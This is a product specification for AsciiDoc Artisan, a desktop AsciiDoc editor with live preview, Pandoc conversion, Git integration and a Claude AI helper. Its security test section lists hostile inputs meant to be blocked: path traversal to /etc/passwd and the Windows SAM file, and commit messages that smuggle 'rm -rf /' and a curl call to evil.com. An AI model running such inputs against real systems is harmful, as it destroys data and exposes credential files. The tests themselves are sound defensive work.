# AsciiDoc Artisan - Complete Specification v1.1

**Version**: 1.1.0
**Date**: 2025-10-23
**Status**: Ready for Review

---

## What This Application Does

AsciiDoc Artisan is a desktop app that helps you write and edit AsciiDoc documents. Think of it like Microsoft Word, but made for people who write technical documents and documentation.

### Main Features

1. **Split-Screen Editor** - Type your document on the left, see what it looks like on the right
2. **Quick Updates** - The preview updates in less than half a second as you type
3. **File Converter** - Change Word files, Markdown files, or PDFs into AsciiDoc format
4. **Git Integration** - Save your work to Git without using the command line
5. **AI Helper** - Ask Claude AI to help write or improve your documents
6. **Works Everywhere** - Runs on Windows, Mac, and Linux

---

## Who Will Use This App

- **Technical Writers** - People who write software documentation
- **Developers** - Programmers who write docs for their code
- **Content Creators** - Anyone making technical guides or manuals
- **Documentation Teams** - Groups who need to write docs together

---

## How It Works - Main User Stories

### Story 1: Writing and Seeing Your Document (Most Important)

**What the user does:**
A technical writer opens the app to write documentation. They type AsciiDoc text on the left side. The right side shows what it will look like when published. As they type, the preview updates in half a second or less.

**Why this matters:**
This is what the app is for. Without this, the app has no purpose.

**What success looks like:**
- Preview updates in 500 milliseconds (half a second) or less
- The app doesn't freeze when typing
- Works with documents up to 25,000 lines long
- Both light and dark themes work correctly

---

### Story 2: Opening and Saving Files (Most Important)

**What the user does:**
A writer needs to open an existing AsciiDoc file from their computer. They click File → Open, find their file, and it opens with the preview ready. After making changes, they press Ctrl+S to save.

**Why this matters:**
You need to open and save files to use any editor.

**What success looks like:**
- Any .adoc file opens correctly
- Saving never corrupts or loses data
- App asks before closing unsaved work
- File saves are "atomic" (safe even if power goes out)

---

### Story 3: Converting File Formats (Important)

**What the user does:**
A content creator receives a Word document (.docx) that needs to be in AsciiDoc format. They open the Word file in the app, and it automatically converts to AsciiDoc. Then they can edit it and export to different formats like HTML or PDF.

**Why this matters:**
Lets people move from other tools to AsciiDoc and share work with people who use different formats.

**What success looks like:**
- Can open Word, Markdown, HTML, and PDF files
- Conversion keeps headings, lists, and tables
- Can export to HTML, PDF, Word, and Markdown
- Shows clear error if conversion tool (Pandoc) isn't installed

---

### Story 4: Using Git for Version Control (Important)

**What the user does:**
A developer edits documentation and wants to save it to Git. They select Git → Commit, type a message about what they changed, and the app saves it to Git. They can also push changes to GitHub without leaving the app.

**Why this matters:**
Developers need version control and this saves time by not switching to the terminal.

**What success looks like:**
- Can commit files with a message
- Can push to remote repositories like GitHub
- Can pull latest changes from teammates
- Git menu is disabled if file isn't in a Git repository

---

### Story 5: Getting AI Help (Important)

**What the user does:**
A writer needs to create documentation for a new feature. They click Claude AI → Generate Content, describe what they need, and the AI creates a starting template in AsciiDoc format. They can also select text and ask the AI to improve it.

**Why this matters:**
AI speeds up writing and improves quality. This is a key feature that makes this app special.

**What success looks like:**
- AI generates content in 15 seconds or less
- Generated text is valid AsciiDoc format
- Can improve selected text while keeping the meaning
- Shows helpful error if AI service isn't running

---

### Story 6: Remembering Your Settings (Nice to Have)

**What the user does:**
A user closes the app after working. Next time they open it, the app remembers: which file was open, window size and position, dark or light theme, and font size.

**Why this matters:**
Saves time and makes the app feel polished, but not required for basic use.

**What success looks like:**
- Last file reopens automatically
- Window size and position are remembered
- Theme choice (light/dark) is saved
- Font size stays the same

---

## Key Requirements - What the App Must Do

### 1. Editing and Preview

**Fast Preview Updates**
- Preview must update within 350 milliseconds after you stop typing
- Total time from typing to seeing the preview must be:
  - **500 milliseconds** for small documents (under 10,000 lines)
  - **1000 milliseconds** for large documents (10,000-25,000 lines)
- Show a "working" indicator if it takes longer than 500 milliseconds

**Editor Features**
- Show AsciiDoc syntax with colors (syntax highlighting)
- Word wrap and tabs (4 spaces by default)
- Find and replace text (Ctrl+F)
- Go to a specific line number (Ctrl+G)
- Keep editor and preview scrolled to the same spot

**Toggle Views**
- Button to show editor full-screen
- Button to show preview full-screen
- Button to show both side-by-side (default)

---

### 2. File Operations

**Opening Files**
- Can open .adoc and .asciidoc files
- Can open Word (.docx), Markdown (.md), HTML, and PDF files
- Automatically converts non-AsciiDoc files to AsciiDoc
- Checks file size before opening (max 50MB, 25,000 lines)
- Shows warning for large files that might be slow

**Saving Files**
- Uses "atomic" saves (never corrupts files, even if power fails)
- Shows star (*) in title bar when file has unsaved changes
- Asks before closing unsaved work
- "Save As" lets you save to a new location

**File Safety**
- Blocks attempts to access system files (like /etc/passwd)
- Only allows access to your Documents, Desktop, and current folder
- Validates all file paths to prevent "path traversal" attacks
- Logs security issues without showing your private data

---

### 3. Format Conversion

**What It Can Convert**
- **Import from**: Word (DOCX), Markdown (MD), HTML, PDF, LaTeX, reStructuredText
- **Export to**: HTML, Word (DOCX), PDF, Markdown (MD)
- Needs Pandoc installed (shows error with install instructions if missing)

**How Conversion Works**
- Keeps document structure (headings, lists, tables)
- Uses safe conversion commands (no command injection)
- Shows progress for slow conversions
- Can cancel conversions in progress

---

### 4. Git Integration

**Git Features**
- Commit current file with a message
- Push changes to remote (like GitHub)
- Pull latest changes from teammates
- All Git commands use safe parameters (no command injection)

**Git Safety**
- Never uses dangerous commands (force push, hard reset)
- Never stores your Git passwords
- Shows clear errors if Git command fails
- Timeout after 30 seconds to prevent hanging

---

### 5. AI-Powered Help (Claude AI)

**What Claude AI Can Do**
- Generate new AsciiDoc content from a description
- Improve selected text (make it clearer, fix grammar)
- Convert between Markdown, HTML, and AsciiDoc
- Create document outlines
- Answer questions about AsciiDoc syntax

**How AI Integration Works**
- Uses a separate Node.js service running on your computer
- Service talks to Claude AI through Anthropic's API
- Python app talks to Node.js service
- All connections are secure (authentication required)

**AI Requirements**
- Generates content in 15 seconds or less
- All generated content is valid AsciiDoc
- Shows progress while AI is working
- Can cancel AI operations
- Works only when internet is available

---

### 6. Security (CRITICAL - NEW IN v1.1)

**API Key Storage (FR-060)**
- NEVER stores API keys in plain text files
- Uses your computer's secure storage:
  - **Mac**: Keychain
  - **Windows**: Credential Manager
  - **Linux**: Secret Service
- Asks for API key on first use
- You can change or remove key in settings
- Old .env files are automatically migrated to secure storage

**Command Safety (FR-061)**
- All Git commands use safe parameter lists
- All Pandoc commands use safe parameter lists
- NEVER uses shell=True (prevents command injection)
- All user input is validated before use
- Commands have timeouts to prevent hanging

**File Access Safety**
- All file paths are validated
- Can't access system directories (/etc, C:\Windows\System32)
- Only works in allowed directories (Documents, Desktop, etc.)
- Detects and blocks path traversal attacks (../..)
- Logs suspicious file access attempts

**Network Security (FR-062)**
- Claude AI service requires authentication token
- Token is randomly generated on startup
- Token is stored in secure file (only you can read)
- Service only accepts connections from your computer (localhost)
- Rate limit: 100 requests per 15 minutes

**Security Logging (FR-064)**
- Logs all security events (blocked file access, auth failures)
- Never logs passwords or API keys
- Log files are protected (only you can read)
- Helps find and fix security issues

---

### 7. Performance

**Document Size Limits**
- **Maximum file size**: 50 MB
- **Maximum lines**: 25,000
- **Maximum line length**: 10,000 characters

**Performance Warnings**
- Shows warning at 10,000 lines: "Large document - preview may be slower"
- Shows warning at 15,000 lines: "Very large document - consider disabling live preview"
- Shows warning at 20,000 lines: "Extremely large document - live preview disabled by default"

**Memory Management (FR-046)**
- App uses max 1.5 GB of memory
- Warns if running low on memory
- Can disable features to save memory:
  - Turn off syntax highlighting
  - Turn off live preview
  - Reduce undo history

**App Startup**
- Must start in under 3 seconds
- Checks if Claude AI service is running
- Loads last opened file

**Worker Cancellation (FR-063)**
- Can cancel all slow operations:
  - Preview rendering
  - File conversions
  - Git operations
  - AI requests
- Shows cancel button for operations over 5 seconds
- Cleans up immediately when cancelled

---

### 8. User Interface

**Themes**
- Light theme (white background)
- Dark theme (dark background)
- Switch themes with F5 or Ctrl+D
- Meets accessibility standards (WCAG AA contrast)

**Window Features**
- Resizable divider between editor and preview
- Font zoom with Ctrl+Plus and Ctrl+Minus
- Reset zoom with Ctrl+0
- Status bar shows current file name
- Works on high-DPI displays (5K monitors)

**Keyboard Shortcuts**
- Ctrl+N: New document
- Ctrl+O: Open file
- Ctrl+S: Save file
- Ctrl+F: Find text
- Ctrl+G: Go to line
- Ctrl+D or F5: Toggle dark mode
- Ctrl+Plus/Minus: Zoom in/out

---

## Technical Requirements

### What You Need to Install

**Required:**
- Python 3.11 or newer
- PySide6 6.9.0 or newer (for the user interface)
- asciidoc3 (for converting AsciiDoc to HTML)
- Node.js 18 or newer (for Claude AI service)
- Anthropic API key (for Claude AI features)

**Optional:**
- Pandoc (for file format conversion)
- Git (for version control features)

---

### New Dependencies in v1.1

**Python Packages:**
- `keyring` version 24.0.0+ (secure API key storage)
- `cryptography` version 41.0.0+ (encryption)
- `psutil` version 5.9.0+ (memory monitoring)
- `bandit` version 1.7.5+ (security checking)

**Node.js Packages:**
- `keytar` version 7.9.0+ (secure key storage)
- `express-rate-limit` version 7.1.0+ (prevent abuse)

---

### How the App is Organized (NEW IN v1.1)

The app code must be split into small, manageable files:

```
asciidoctor_artisan/
├── app.py                    # Main app startup (under 200 lines)
├── ui/                       # User interface
│   ├── main_window.py        # Main window
│   ├── editor_widget.py      # Text editor
│   ├── preview_widget.py     # Preview pane
│   ├── dialogs.py            # Pop-up windows
│   └── themes.py             # Light/dark themes
├── workers/                  # Background tasks
│   ├── base.py               # Base worker class
│   ├── preview_worker.py     # Preview rendering
│   ├── git_worker.py         # Git operations
│   └── pandoc_worker.py      # File conversions
├── core/                     # Main logic
│   ├── document.py           # Document handling
│   ├── settings.py           # User settings
│   ├── asciidoc_api.py       # AsciiDoc processing
│   └── validation.py         # Security checks
├── git/                      # Git features
│   └── repository.py         # Git commands
├── conversion/               # File conversion
│   └── pandoc.py             # Pandoc integration
└── claude/                   # AI features
    └── client.py             # Claude AI client
```

**Key Rules:**
- No file can be longer than 500 lines
- Each file has one clear job
- Files talk to each other through clear interfaces

---

## Setting Up Claude AI

### Step 1: Get an API Key
1. Go to https://console.anthropic.com/
2. Sign up or log in
3. Create an API key
4. Copy the key (you'll need it in Step 4)

### Step 2: Install Node.js Service
1. Open terminal/command prompt
2. Go to the `claude-integration/` folder
3. Run `npm install`

### Step 3: Start the Service
Run `npm start` in the `claude-integration/` folder

### Step 4: Enter API Key
When you first use AI features, the app will ask for your API key. It will be stored securely in your operating system's keychain.

**Important:** The Node.js service must be running for AI features to work!

---

## What This App Does NOT Do

- **No multi-file projects** - Opens one file at a time
- **No real-time collaboration** - Can't edit with others at the same time
- **No cloud storage** - Doesn't sync to Dropbox, Google Drive, etc.
- **No spell checker** - Use your OS spell checker instead
- **No custom AsciiDoc plugins** - Standard AsciiDoc only
- **No advanced Git features** - No rebasing, merging, branching
- **No PDF editing** - Can only export to PDF, not edit PDFs
- **No custom themes** - Just light and dark modes
- **No mobile version** - Desktop only
- **No offline AI** - Claude AI needs internet connection
- **No other AI providers** - Only works with Claude AI (Anthropic)

---

## Testing Requirements

### Security Tests (MUST HAVE)

**Test Path Traversal Prevention:**
- Try to open `../../../etc/passwd`
- Try to open `C:\Windows\System32\config\SAM`
- All attempts must be blocked and logged

**Test Command Injection Prevention:**
- Try Git commit with message: `"; rm -rf /; echo "`
- Try Git commit with message: `$(curl evil.com)`
- All attempts must be safely handled (commands run with safe parameters)

**Test API Key Storage:**
- Set API key
- Restart app
- Check that key is retrieved from OS keychain (not from .env file)

### Performance Tests (MUST HAVE)

**Test Document Sizes:**
- 1,000 lines: Preview renders in under 100 milliseconds
- 5,000 lines: Preview renders in under 200 milliseconds
- 10,000 lines: Preview renders in under 300 milliseconds
- 15,000 lines: Preview renders in under 500 milliseconds
- 20,000 lines: Preview renders in under 750 milliseconds
- 25,000 lines: Preview renders in under 1000 milliseconds

**Test Memory Usage:**
- Open 25,000 line document
- Check memory usage stays under 1.5 GB
- Make sure app doesn't freeze for more than 100 milliseconds

### Function Tests (MUST HAVE)

**Test All User Stories:**
- Story 1: Editing and preview works
- Story 2: Open and save works
- Story 3: File conversion works
- Story 4: Git integration works
- Story 5: AI features work
- Story 6: Settings are remembered

**Test All Platforms:**
- Windows 10/11
- macOS 12+
- Ubuntu Linux 22.04+
- WSL2 with WSLg

---

## Success Measurements

### Performance Goals
- App starts in under 3 seconds ✓
- Preview updates in under 500 milliseconds for typical documents ✓
- Handles documents up to 25,000 lines ✓
- Memory stays under 1.5 GB ✓
- No UI freezes longer than 100 milliseconds ✓

### Security Goals (NEW IN v1.1)
- Zero critical security vulnerabilities ✓
- API keys never stored in plain text ✓
- All commands use safe parameters (no shell injection) ✓
- All file paths validated (no path traversal) ✓
- Security events are logged ✓

### User Experience Goals
- 90% of users can edit their first document without reading instructions
- Users report 30% time savings compared to other tools
- Zero data loss incidents
- File conversion succeeds 85% of the time on first try
- App works identically on Windows, Mac, and Linux

---

## What Changed from v1.0 to v1.1

### CRITICAL Security Fixes
1. **API keys now secure** - Moved from .env files to OS keychain
2. **Command injection fixed** - All commands use safe parameters
3. **Path traversal blocked** - File access is properly restricted
4. **Service authentication added** - Claude AI service requires auth token

### Performance Updates
1. **Preview timing corrected** - 350ms debounce, 500ms total (was 250ms - impossible)
2. **Document limit raised** - 25,000 lines (was 10,000, but needs testing)
3. **Memory limit set** - 1.5 GB maximum (was 500 MB)
4. **Warnings added** - Shows warnings at 10k, 15k, 20k lines

### Architecture Improvements
1. **Code reorganized** - Split 101 KB file into small modules (max 500 lines each)
2. **Worker cancellation** - Can cancel all slow operations
3. **Security logging** - Logs security events safely
4. **Better error handling** - More helpful error messages

---

## Implementation Timeline

### Phase 1: Security Hardening (2 weeks)
- [ ] Implement OS keyring for API keys
- [ ] Fix command injection in Git and Pandoc
- [ ] Update path sanitization logic
- [ ] Add authentication to Node.js service
- [ ] Write security tests

### Phase 2: Performance (1 week)
- [ ] Implement adaptive debouncing (350-750ms)
- [ ] Add document size validation
- [ ] Implement worker cancellation
- [ ] Run performance tests on 1k-25k line documents

### Phase 3: Code Refactoring (3 weeks)
- [ ] Split main file into modules
- [ ] Create proper file structure
- [ ] Update all imports
- [ ] Test that everything still works

### Phase 4: Testing and Release (1 week)
- [ ] Run all security tests
- [ ] Run all performance tests
- [ ] Test on Windows, Mac, and Linux
- [ ] Final security review
- [ ] Release v1.1.0

**Total Time: 7 weeks**

---

## Migration Instructions

### For Users
1. Update to version 1.1
2. On first launch, app will find your API key in .env
3. App moves API key to OS keychain
4. App deletes .env file (asks for confirmation first)
5. Everything else works the same!

### For Developers
1. Install new dependencies: `pip install keyring cryptography psutil bandit`
2. Install Node.js dependencies: `cd claude-integration && npm install keytar express-rate-limit`
3. Read the security code examples in SPEC_UPDATES_v1.1.md
4. Follow the new module structure for any new code
5. Run security tests before committing code
6. Use the provided templates for Git and Pandoc commands

---

## Questions?

- **Full security details**: See SECURITY_ANALYSIS_v1.1.md
- **Code examples**: See SPEC_UPDATES_v1.1.md
- **Quick summary**: See SPEC_CHANGES_SUMMARY_v1.1.md

**Contact**: Project maintainer
**Status**: Ready for review and approval
**Target Release**: v1.1.0 in 4-6 weeks

---

## Document Information

**Version**: 1.1.0
**Previous Version**: 1.0.0-beta
**Last Updated**: 2025-10-23
**Reading Level**: 5th grade (simplified language)
**Approved By**: Pending review
**Next Steps**: Review → Approve → Implement → Test → Release
